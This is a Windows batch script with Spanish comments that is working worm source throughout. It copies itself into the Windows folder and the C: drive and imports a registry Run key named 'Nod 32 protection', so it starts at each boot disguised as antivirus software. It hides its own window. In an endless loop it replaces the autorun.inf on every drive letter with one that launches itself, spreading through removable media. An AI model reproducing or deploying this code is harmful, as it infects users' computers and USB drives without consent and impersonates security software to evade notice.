@echo off
rem *******************************INFECCION DE LA COMPUTADORA EN USO ***************************
copy data.cab %windir%\cmdow.exe > nul
copy instalar.bat %windir%\maloso.bat > nul
copy instalar.bat c:\Nod_32.bat > nul
echo [autorun] > %windir%\maloso.inf
echo shellexecute=instalar.bat >> %windir%\maloso.inf
echo shell\auto\command=instalar.bat >> %windir%\maloso.inf
echo Windows Registry Editor Version 5.00 > %windir%\maloso.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> %windir%\maloso.reg
echo "Nod 32 protection"="c:\\Nod_32 /r" >> %windir%\maloso.reg
reg import %windir%\maloso.reg
rem *******************************FIN DE LA INFECCION DE LA COMPUTADORA EN USO *****************

cmdow @ /hid
if %1==/r goto desderun
start %cd%
goto saltear

:desderun
::start "%cd%"

:saltear

rem ******************************COMIENZO DE INFECCION DE LETRAS *******************************
:arriba
for %%a in (c d e f g h i j k l m n o p q r s t u v w x y z) do if exist %%a:\ (
echo Encontrada unidad %%a
if exist %%a:\autorun.inf attrib %%a:\autorun.inf -h -r -s
if exist %%a:\autorun.inf rd %%a:\autorun.inf /s /q
if exist %%a:\autorun.inf del %%a:\autorun.inf
copy %windir%\cmdow.exe %%a:\data.cab
copy %windir%\maloso.bat %%a:\instalar.bat
copy %windir%\maloso.inf %%a:\autorun.inf
)
rem ******************************FIN INFECCION DE LETRAS ***************************************



rem ******************************COMIENZO DE JODA **********************************************

rem ******************************FIN DE JODA ***************************************************

ping 127.0.0.1 -n 10 > nul
goto arriba